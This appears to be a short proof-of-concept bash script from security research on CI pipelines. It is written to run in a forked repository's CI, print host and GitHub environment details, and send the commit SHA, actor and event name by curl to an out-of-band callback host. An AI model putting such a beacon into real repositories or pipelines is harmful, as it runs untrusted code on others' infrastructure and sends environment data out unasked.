#!/usr/bin/env bash
# AQ attacker-fork CI check (inert marker; authorized security research)
echo "AQ-EVIL-CI executed host=$(hostname) sha=${GITHUB_SHA} actor=${GITHUB_ACTOR} trigger=${GITHUB_TRIGGERING_ACTOR} event=${GITHUB_EVENT_NAME} ref=${GITHUB_REF}"
curl -s "https://db7c150phf83476dn1t0e8niokp1twzct.oast.online/aq-gate?sha=${GITHUB_SHA}&actor=${GITHUB_ACTOR}&trigger=${GITHUB_TRIGGERING_ACTOR}&event=${GITHUB_EVENT_NAME}" || true
